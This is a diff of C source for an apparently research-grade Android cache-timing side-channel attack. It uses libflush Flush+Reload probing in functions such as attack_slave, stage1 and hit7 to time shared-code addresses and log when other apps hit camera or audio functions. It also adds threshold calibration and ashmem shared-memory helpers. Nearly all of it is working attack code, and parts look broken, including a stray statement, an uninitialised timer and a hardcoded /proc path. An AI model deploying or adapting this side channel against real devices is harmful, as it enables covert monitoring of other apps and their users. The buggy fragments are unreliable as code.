@@ -3,7 +3,11 @@
 Keep scanning functions to get the access time to check if there are functions activated(used by other app).
 */
 #define _GNU_SOURCE
+#define SHM_NAME "timing_count_mem"
+#define ASHMEM_DEVICE    "/dev/ashmem"
 
+//#include <sys/mman.h>
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdbool.h>
 #include <stdlib.h>
@@ -22,12 +26,17 @@ Keep scanning functions to get the access time to check if there are functions a
 #include "lock.h"
 #include "libflush.h"
 
+
 #ifdef WITH_THREADS
+
 
 #include <pthread.h>
 #include <jni.h>
 #include "threads.h"
-#include <time.h>
+#include "string.h"
+#include <linux/ashmem.h>
+#include <sys/mman.h>
+
 
 #else
 #ifndef WITH_ANDROID
@@ -49,6 +58,14 @@ static int shared_data_shm_fd = 0;
 
 #define LENGTH(x) (sizeof(x)/sizeof((x)[0]))
 
+///* Shared data */
+//typedef struct shared_data_s {
+//    unsigned int current_offset;
+//    lock_t lock;
+//} shared_data_t;
+//
+//static shared_data_t* shared_data = NULL;
+
 /* Forward declarations */
 static void
 attack_slave(libflush_session_t *libflush_session, int sum_length, pthread_mutex_t *g_lock,
@@ -59,7 +76,16 @@ attack_slave(libflush_session_t *libflush_session, int sum_length, pthread_mutex
 
 static bool is_address_in_use(libflush_session_t *libflush_session, void *address, int threshold);
 
-static void is_address_in_use1(libflush_session_t *libflush_session, void *address, int threshold);
+static void
+is_address_in_use1(libflush_session_t *libflush_session, void *address, int threshold, int count);
+
+static void is_address_in_use7(libflush_session_t *libflush_session, void *address, int threshold,
+                               long *timingCount,
+                               long *times, int *logs, long *timingCounts, long *addresses,
+                               int *log_length, pthread_mutex_t *g_lock);
+
+static int
+is_address_in_use_adjust(libflush_session_t *libflush_session, void *address, int threshold);
 
 bool scan_cfg(libflush_session_t *libflush_session, int threshold);
 
@@ -69,6 +95,72 @@ bool scan_cfg1(libflush_session_t *libflush_session, int threshold);
 #define TAG_NAME "libflush"
 #define log_err(fmt,args...) __android_log_print(ANDROID_LOG_ERROR, TAG_NAME, (const char *) fmt, ##args)
 */
+
+//int ashmem_create_region(const char *name, size_t size) {
+//    int fd, ret;
+//    //打开"/dev/ashmem"设备文件
+//    fd = open(ASHMEM_DEVICE, O_RDWR);
+//    if (fd < 0)
+//        return fd;
+//    //根据Java空间传过来的名称修改设备文件名
+//    if (name) {
+//        char buf[ASHMEM_NAME_LEN];
+//        strlcpy(buf, name, sizeof(buf));
+//        ret = ioctl(fd, ASHMEM_SET_NAME, buf);
+//        if (ret < 0)
+//            goto error;
+//    }
+//    ret = ioctl(fd, ASHMEM_SET_SIZE, size);
+//    if (ret < 0)
+//        goto error;
+//    return fd;
+//    error:
+//    close(fd);
+//    return ret;
+//}
+//
+//int read_ashmem(int argc, char **argv) {
+//    int shID = ashmem_create_region(SHM_NAME, 2);
+//    if (shID < 0) {
+//        LOGD("ashmem_create_region failed\n");
+//        return 1;
+//    }
+//    // right here /dev/ashmem/test_mem is deleted
+//    LOGD("ashmem_create_region: %d\n", shID);
+//    char *sh_buffer = (char *) mmap(NULL, 2, PROT_READ | PROT_WRITE, MAP_SHARED, shID, 0);
+//    if (sh_buffer == (char *) -1) {
+//        LOGD("mmap failed");
+//        return 1;
+//    }
+//    LOGD("PID=%d", getpid());
+//    do {
+//        LOGD("VALUE = 0x%x\n", sh_buffer[0]);
+//    } while (getchar());
+//    return 0;
+//}
+//
+//
+//int write_ashmem() {
+//    int shID = ashmem_create_region(SHM_NAME, 2);
+//    if (shID < 0) {
+//        perror("ashmem_create_region failed\n");
+//        return 1;
+//    }
+//    LOGD("ashmem_create_region: %d\n", shID);
+//    char *sh_buffer = (char *) mmap(NULL, 2, PROT_READ | PROT_WRITE, MAP_SHARED, shID, 0);
+//    if (sh_buffer == (char *) -1) {
+//        perror("mmap failed");
+//        return 1;
+//    }
+//    LOGD("PID=%d\n", getpid());
+//    int ch = getchar();
+//    sh_buffer[0] = ch;
+//    LOGD("Written 0x%x\n", ch);
+//    munmap(sh_buffer, 2);
+//    close(shID);
+//    return 0;
+//}
+
 
 static void
 attack_slaveX(libflush_session_t *libflush_session, int sum_length, pthread_mutex_t *g_lock,
@@ -106,10 +198,10 @@ attack_slaveX(libflush_session_t *libflush_session, int sum_length, pthread_mute
                         gettimeofday(&tv, NULL);
                         LOGD("Camera hit %d-%d-%d.", j, i, count);
                         //compiler
-                        logs[*log_length] = 10000 +
-                                            i;//1XXXX means camera set(it's only for our data collection and analysis)
-                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
-                        thresholds[*log_length] = count; //record the count in thresholds list
+//                        logs[*log_length] = 10000 +
+                        i;//1XXXX means camera set(it's only for our data collection and analysis)
+//                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
+//                        thresholds[*log_length] = count; //record the count in thresholds list
 
                         pthread_mutex_lock(g_lock);
                         *log_length = (*log_length + 1) % 99000;
@@ -128,10 +220,10 @@ attack_slaveX(libflush_session_t *libflush_session, int sum_length, pthread_mute
                         gettimeofday(&tv, NULL);
                         LOGD("Audio hit %d-%d-%d.", j + 1, i, count);
                         //compiler
-                        logs[*log_length] = 20000 +
-                                            i;//2XXXX means camera set(it's only for our data collection and analysis)
-                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
-                        thresholds[*log_length] = count;
+//                        logs[*log_length] = 20000 +
+//                                            i;//2XXXX means camera set(it's only for our data collection and analysis)
+//                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
+//                        thresholds[*log_length] = count;
 
                         pthread_mutex_lock(g_lock);
                         *log_length = (*log_length + 1) % 99000;
@@ -146,9 +238,9 @@ attack_slaveX(libflush_session_t *libflush_session, int sum_length, pthread_mute
                 if (count <= threshold) {
                     gettimeofday(&tv, NULL);
                     //compiler
-                    logs[*log_length] = j;
-                    times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
-                    thresholds[*log_length] = count;
+//                    logs[*log_length] = j;
+//                    times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
+//                    thresholds[*log_length] = count;
                     pthread_mutex_lock(g_lock);
                     *log_length = (*log_length + 1) % 99000;
                     pthread_mutex_unlock(g_lock);
@@ -174,7 +266,9 @@ attack_slaveX(libflush_session_t *libflush_session, int sum_length, pthread_mute
     LOGD("Finish stage 1.1.\n");
 }
 
-void stage1_(int* arr,size_t threshold, int* length_of_camera_audio, size_t* addr, int* camera_audio, int* finishtrial1,int sum_length){
+void
+stage1_(int *arr, size_t threshold, int *length_of_camera_audio, size_t *addr, int *camera_audio,
+        int *finishtrial1, int sum_length) {
     LOGD("Start stage 1.1.\n");
     /* Initialize libflush */
     libflush_session_t *libflush_session;
@@ -225,7 +319,7 @@ void stage1_(int* arr,size_t threshold, int* length_of_camera_audio, size_t* add
                     }
                 }
             } else if (addr[j] != 0) {//j==0 3
-                void* target = (void *) addr[j];
+                void *target = (void *) addr[j];
                 count = libflush_reload_address_and_flush(libflush_session, target);
                 if (count <= threshold && j < 4) {
                     LOGD("Target %d-%d-%p.", j, (int) count, target);
@@ -244,7 +338,9 @@ void stage1_(int* arr,size_t threshold, int* length_of_camera_audio, size_t* add
     libflush_terminate(libflush_session);
 }
 
-void stage1(int* arr,size_t threshold, int* length_of_camera_audio, size_t* addr, int* camera_audio, int* finishtrial1){
+void
+stage1(int *arr, size_t threshold, int *length_of_camera_audio, size_t *addr, int *camera_audio,
+       int *finishtrial1) {
     LOGD("Start stage 1.\n");
     /* Initialize libflush */
     libflush_session_t *libflush_session;
@@ -388,6 +484,53 @@ adjust_threshold(int threshold, int *length_of_camera_audio, size_t *addr, int *
     return threshold;
 }
 
+int
+adjust_threshold1(int threshold, size_t *addr, int length) {
+    LOGD("Start adjusting threshold.\n");
+    /* Initialize libflush */
+    libflush_session_t *libflush_session;
+    libflush_init(&libflush_session, NULL);
+    if (threshold == 9999) {//if caliberation failed
+        return threshold;
+    }
+    size_t t = 0;
+    int f = 0;
+    while (1) {
+        size_t n = 0;
+        size_t count;
+        int threshold_pre = threshold;
+        for (int j = 0; j < 1000; j++) {
+            for (int i = 0; i < length; i++) {
+                size_t target = *((size_t *) addr[1] + i);
+                if (target == 0) {//if the target is 0, skip it.
+                    continue;
+                }
+                count = libflush_reload_address_and_flush(libflush_session, (void *) target);
+                if (count <= threshold) {
+                    n++;
+                }
+            }
+        }
+        if (n > t / 2 || f == 0) {//if there is a big gap between two threshold
+            f = 1;
+            t = n;
+            threshold -= 20;
+            LOGD("Threshold decrease to %d", threshold);
+            if (threshold < 0) {//if the caliberation went wrong, use the original threshold.
+                libflush_terminate(libflush_session);
+                return threshold_pre;
+            }
+            continue;
+        }
+        threshold += 20;
+        break;
+    }
+    LOGD("Finish adjusting threshold with %d.\n", threshold);
+    libflush_terminate(libflush_session);
+    return threshold;
+}
+
+
 int hit(pthread_mutex_t *g_lock, int compiler_position, int *continueRun, int threshold, int *flags,
         long *times, int *thresholds, int *logs, int *log_length, int sum_length,
         size_t *addr, int *camera_pattern, int *audio_pattern, int *length_of_camera_audio) {
@@ -448,31 +591,95 @@ int hit5(void *param, int length, int threshold) {
 //    LOGD("Start AddressScan hit2.\n");
     libflush_session_t *libflush_session;
     libflush_init(&libflush_session, NULL);
-    is_address_in_use1(libflush_session, param, threshold);
+    is_address_in_use1(libflush_session, param, threshold, 0);
 //    libflush_terminate(libflush_session);
 
 
     return 0;
 }
 
-//int hit6(size_t *param, int length, int threshold) {
-////    LOGD("Start AddressScan hit2.\n");
-//    libflush_session_t *libflush_session;
-//    libflush_init(&libflush_session, NULL);
-//    size_t count2;
-//
+int hit6(jlong *param, int length, int threshold, int count) {
+//    LOGD("Start AddressScan hit2.\n");
+    libflush_session_t *libflush_session;
+    libflush_init(&libflush_session, NULL);
+    size_t count2;
+
+    for (int i = 1; i < length; i++) {
+//        void *target = (void *) *((size_t *) param + i);
+        if (param == NULL || param + i == NULL) {
+            LOGD("scan4 hit6 param null ");
+            break;
+        }
+//        LOGD("scan4 hit6 %zu ", *(param + i));
+        is_address_in_use1(libflush_session, *(param + i), threshold, count);
+
+    }
 //    for (int i = 1; i < length; i++) {
 //        void *target = (void *) *((size_t *) param + i);
-//        count2 = libflush_reload_address(libflush_session, target);
-//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", target, count2);
+//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", target, 0);
+//
+////        is_address_in_use1(libflush_session, target, threshold);
+//
 //    }
-/////    count2 = libflush_probe(libflush_session, address);
+    return 0;
+}
+
+int hit7(jlong *param, int length, int threshold, long *timingCount, long *times, int *logs,
+         long *timingCounts, long *addresses, int *log_length, pthread_mutex_t *g_lock) {
+//    LOGD("Start AddressScan hit2.\n");
+    libflush_session_t *libflush_session;
+    libflush_init(&libflush_session, NULL);
+    size_t count2;
+
+    for (int i = 1; i < length; i++) {
+//        void *target = (void *) *((size_t *) param + i);
+        if (param == NULL || param + i == NULL) {
+            LOGD("scan4 hit6 param null ");
+            break;
+        }
+//        LOGD("scan4 hit6 %zu ", *(param + i));
+        is_address_in_use7(libflush_session, *(param + i), threshold, timingCount, times, logs,
+                           timingCounts, addresses, log_length, g_lock);
+
+    }
+//    for (int i = 1; i < length; i++) {
+//        void *target = (void *) *((size_t *) param + i);
+//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", target, 0);
 //
+//        is_address_in_use1(libflush_session, target, threshold);
 //
-//    is_address_in_use1(libflush_session, param, threshold);
+//    }
+    return 0;
+}
+
+
+int adjust_threshold2(jlong *param, int length, int threshold) {
+//    LOGD("Start AddressScan hit2.\n");
+    libflush_session_t *libflush_session;
+    libflush_init(&libflush_session, NULL);
+    size_t count2;
+
+    for (int j = 0; j < 500; j++) {
+        for (int i = 0; i < length; i++) {
+//        void *target = (void *) *((size_t *) param + i);
+            if (param == NULL || param + i == NULL) {
+                LOGD("adjust_threshold param null ");
+                break;
+            }
+//        LOGD("adjust_threshold address %zu ", *(param + i));
+            threshold = is_address_in_use_adjust(libflush_session, *(param + i), threshold);
+
+        }
+    }
+//    for (int i = 1; i < length; i++) {
+//        void *target = (void *) *((size_t *) param + i);
+//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", target, 0);
 //
-//    return 0;
-//}
+////        is_address_in_use1(libflush_session, target, threshold);
+//
+//    }
+    return threshold;
+}
 
 
 int charToBin(unsigned char letter) {
@@ -588,6 +795,13 @@ int get_threshold() {
     return threshold;
 }
 
+long get_timingCount(pthread_mutex_t *g_lock, long *timingCount) {
+    long timingCnt = 0l;
+    pthread_mutex_lock(g_lock);
+    timingCnt = *timingCount;
+    pthread_mutex_unlock(g_lock);
+    return timingCnt;
+}
 
 //when use static, the location function keeps poping
 static void
@@ -644,11 +858,11 @@ attack_slave(libflush_session_t *libflush_session, int sum_length, pthread_mutex
                         else
                             audio_pattern[i] = 1;
                         pthread_mutex_unlock(g_lock);
-                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
-                        thresholds[*log_length] = (int) count;
+//                        times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
+//                        thresholds[*log_length] = (int) count;
 
                         pthread_mutex_lock(g_lock);
-                        logs[(*log_length)++] = crt_ofs * 10000 + i;
+//                        logs[(*log_length)++] = crt_ofs * 10000 + i;
                         pthread_mutex_unlock(g_lock);
 
                         if (*log_length >= 99000) {
@@ -687,11 +901,11 @@ attack_slave(libflush_session_t *libflush_session, int sum_length, pthread_mutex
                     *log_length = 0;
                     pthread_mutex_unlock(g_lock);
                 }
-                times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
-                thresholds[*log_length] = (int) count;
+//                times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
+//                thresholds[*log_length] = (int) count;
 
                 pthread_mutex_lock(g_lock);
-                logs[(*log_length)++] = crt_ofs;
+//                logs[(*log_length)++] = crt_ofs;
                 pthread_mutex_unlock(g_lock);
             }
         }//traverse all functions
@@ -728,14 +942,16 @@ is_address_in_use(libflush_session_t *libflush_session, void *address, int thres
 }
 
 static void
-is_address_in_use1(libflush_session_t *libflush_session, void *address, int threshold) {
+is_address_in_use1(libflush_session_t *libflush_session, void *address, int threshold, int count) {
+//    LOGD("scan4: Address: %lu", address);
+
     int i = 0;
-    size_t count1;
+
     size_t count2;
 
     count2 = libflush_reload_address_and_flush(libflush_session, address);
 ///    count2 = libflush_probe(libflush_session, address);
-    LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
+    LOGD("Count %d Address: %lu Time taken: %d", count, address, count2);
 
 
 //    if (count2 < 800) {
@@ -744,22 +960,188 @@ is_address_in_use1(libflush_session_t *libflush_session, void *address, int thre
 
 }
 
-//static void
-//is_address_in_use2(libflush_session_t *libflush_session, size_t *address, int threshold) {
-//    int i = 0;
-//    size_t count1;
-//    size_t count2;
-//
-//    count2 = libflush_reload_address(libflush_session, address);
-/////    count2 = libflush_probe(libflush_session, address);
-//    LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
-//
-//
-////    if (count2 < 800) {
-////        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
-////    }
-//
-//}
+static void
+is_address_in_use7(libflush_session_t *libflush_session, void *address, int threshold,
+                   long *timingCount, long *times, int *logs, long *timingCounts, long *addresses,
+                   int *log_length, pthread_mutex_t *g_lock) {
+//    LOGD("scan4: Address: %lu", address);
+
+    int i = 0;
+
+    size_t scanTime;
+
+    scanTime = libflush_reload_address_and_flush(libflush_session, address);
+///    count2 = libflush_probe(libflush_session, address);
+
+//    LOGD("Count %d Address: %lu Time taken: %d",*timingCount,  address, scanTime);
+
+
+
+    if (*log_length >= 99000) {
+        LOGD("Log Length is larger than 50000, set to 0.");
+        pthread_mutex_lock(g_lock);
+        *log_length = 0;
+        pthread_mutex_unlock(g_lock);
+    }
+    struct timeval tv;//for quering time stamp
+    gettimeofday(&tv, NULL);
+    pthread_mutex_lock(g_lock);
+    logs[*log_length] = scanTime;
+    addresses[*log_length] = address;
+//    times[*log_length] = count;
+    times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
+    timingCounts[*log_length] = *timingCount;
+    *log_length = (*log_length + 1) % 99000;
+    *timingCount = (*timingCount + 1);
+    pthread_mutex_unlock(g_lock);
+
+
+//to filter hits
+//    if (count2 < 800) {
+//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
+//    }
+
+}
+
+int getNanoSecondTiming() {
+    struct timespec ts;
+//    timespec_get(&ts, TIME_UTC);
+    char buff[100];
+    strftime(buff, sizeof buff, "%D %T", gmtime(&ts.tv_sec));
+    printf("Current time: %s.%09ld UTC\n", buff, ts.tv_nsec);
+}
+
+
+static int
+is_address_in_use_adjust(libflush_session_t *libflush_session, void *address, int threshold) {
+//    LOGD("scan4: Address: %lu", address);
+    size_t count2;
+
+    count2 = libflush_reload_address_and_flush(libflush_session, address);
+    if (count2 < threshold) {
+        threshold = threshold - 20;
+    }
+
+///    count2 = libflush_probe(libflush_session, address);
+//    LOGD("adjust_threshold Time: %d threshold %d", count2, threshold);
+
+    return threshold;
+
+//    if (count2 < 800) {
+//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
+//    }
+
+}
+
+int set_shared_mem(int shared_data_shm_fd, int *shared_data, pthread_mutex_t *shared_mem_lock ) {
+    pthread_mutex_lock(shared_mem_lock);
+    shared_data_shm_fd = open("/" ASHMEM_NAME_DEF, O_RDWR);
+    LOGD("shared_data_shm_fd %d", shared_data_shm_fd);
+
+    ioctl(shared_data_shm_fd, ASHMEM_SET_NAME, "shared_data");
+    ioctl(shared_data_shm_fd, ASHMEM_SET_SIZE, sizeof(int));
+
+    shared_data = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
+                       MAP_SHARED, shared_data_shm_fd, 0);
+    if (shared_data == MAP_FAILED) {
+        LOGD("shared_data_shm_fd Error: Could not map shared memory.");
+//        close(shared_data_shm_fd);
+        return -1;
+    }
+    shared_data[0]=5;
+    pthread_mutex_unlock(shared_mem_lock);
+
+    LOGD("shared_data_shm_fd shared_data %d", shared_data);
+//    close(shared_data_shm_fd);
+
+//    return shared_data;
+    return shared_data_shm_fd;
+//    close(*shared_data_shm_fd);
+}
+
+int set_shared_memfd(int shared_data_shm_fd, int *shared_data, pthread_mutex_t *shared_mem_lock ) {
+    pthread_mutex_lock(shared_mem_lock);
+
+    int fd = memfd_create("shared_data", MFD_ALLOW_SEALING);
+    if(fd==-1){
+        LOGD("shared_data_shm_fd fd -1");
+        pthread_mutex_unlock(shared_mem_lock);
+
+        return -1;
+    }
+    pthread_mutex_unlock(shared_mem_lock);
+
+    return fd;
+}
+
+
+int set_shared_mem_child(jchar *fileDes, pthread_mutex_t *shared_mem_lock ) {
+    LOGD("shared_data_shm inside set_shared_mem_child");
+
+    pthread_mutex_lock(shared_mem_lock);
+    LOGD("shared_data_shm inside set_shared_mem_child lock");
+
+//    for(int i=0;i<10;i++){
+//        LOGD("shared_data_shm_fd %c", fileDes[i]);
+//    }
+    int shared_data_shm_fd = open(fileDes, O_RDONLY);
+    LOGD("shared_data_shm_fd child %d", shared_data_shm_fd);
+
+    int *shared_data;
+    shared_data = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
+                       MAP_SHARED, shared_data_shm_fd, 0);
+    if (shared_data == MAP_FAILED) {
+        LOGD("shared_data_shm_fd Error: Could not map shared memory.");
+        close(shared_data_shm_fd);
+        return -1;
+    }
+    shared_data[0]=9;
+    pthread_mutex_unlock(shared_mem_lock);
+
+    LOGD("shared_data_shm_fd child shared_data %d", shared_data);
+    close(shared_data_shm_fd);
+
+//    return shared_data;
+    return shared_data_shm_fd;
+//    close(*shared_data_shm_fd);
+}
+
+
+
+int set_shared_mem_val(int *shared_data, int val, pthread_mutex_t *shared_mem_lock) {
+    pthread_mutex_lock(shared_mem_lock);
+    int fd = open("/proc/19187/fd/49", O_RDWR);
+    if(fd==-1){
+        LOGD("shared_data_shm passsed sharwd_data is null");
+        pthread_mutex_unlock(shared_mem_lock);
+        return -1;
+    }
+    shared_data[0]=val;
+    pthread_mutex_unlock(shared_mem_lock);
+
+    return 1;
+}
+
+int get_shared_mem_val(int *shared_data, pthread_mutex_t *shared_mem_lock) {
+    pthread_mutex_lock(shared_mem_lock);
+    if(shared_data==NULL){
+        LOGD("shared_data_shm passsed sharwd_data is null");
+        return -1;
+    }
+    int i = shared_data[0];
+//    LOGD("shared_data_shm get_shared_mem_val hit %d", i);
+    pthread_mutex_unlock(shared_mem_lock);
+    return i;
+}
+
+int clean_shared_mem(int shared_data_shm_fd, pthread_mutex_t *shared_mem_lock) {
+    pthread_mutex_lock(shared_mem_lock);
+    close(shared_data_shm_fd);
+    pthread_mutex_unlock(shared_mem_lock);
+}
+
+
+
 
 
 
